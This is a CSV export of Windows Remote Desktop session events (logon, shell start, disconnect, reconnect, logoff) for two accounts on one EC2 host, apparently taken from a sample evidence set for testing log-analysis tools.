2309,2309,2024-11-22 22:39:20.2253044,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2310,2310,2024-11-22 22:39:20.2406788,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2311,2311,2024-11-22 22:39:20.5052651,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2312,2312,2024-11-22 22:39:20.9199133,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2313,2313,2024-11-22 22:45:55.4618784,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2314,2314,2024-11-22 22:45:55.8932403,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 3,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""3"",""Reason"":""12""}}}"
2315,2315,2024-11-22 22:45:56.0767078,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2316,2316,2024-11-22 22:47:27.6393641,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2317,2317,2024-11-22 22:47:27.6455200,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2318,2318,2024-11-22 22:47:31.5487571,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2319,2319,2024-11-22 22:47:31.9642288,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2320,2320,2024-11-22 22:48:00.9471093,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""0""}}}"
2321,2321,2024-11-22 22:48:01.8423921,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2322,2322,2024-11-22 22:48:30.4664298,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: The client's connection was replaced by another connection (i.e. a user reconnected to a previous RDP session),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""5""}}}"
2323,2323,2024-11-22 22:48:31.3125540,25,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session reconnection succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2324,2324,2024-11-22 22:48:45.9554792,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\samurai,,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2325,2325,2024-11-22 22:48:46.4906255,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""12""}}}"
2326,2326,2024-11-22 22:48:46.5874467,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2327,2327,2024-11-22 22:48:59.8480309,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2328,2328,2024-11-22 22:48:59.8851123,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2329,2329,2024-11-22 22:49:00.1688952,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2330,2330,2024-11-22 22:49:00.4402605,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2331,2331,2024-11-22 22:49:16.7320309,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\samurai,,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2332,2332,2024-11-22 22:49:16.9168982,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 5,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""5"",""Reason"":""12""}}}"
2333,2333,2024-11-22 22:49:17.0273432,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2334,2334,2024-11-22 22:50:25.1962381,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6""}}}"
2335,2335,2024-11-22 22:50:25.2172990,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6""}}}"
2336,2336,2024-11-22 22:50:25.4450751,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2428,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 6,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6"",""Address"":""219.100.37.234""}}}"
2337,2337,2024-11-22 22:50:25.8655849,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6"",""Address"":""219.100.37.234""}}}"
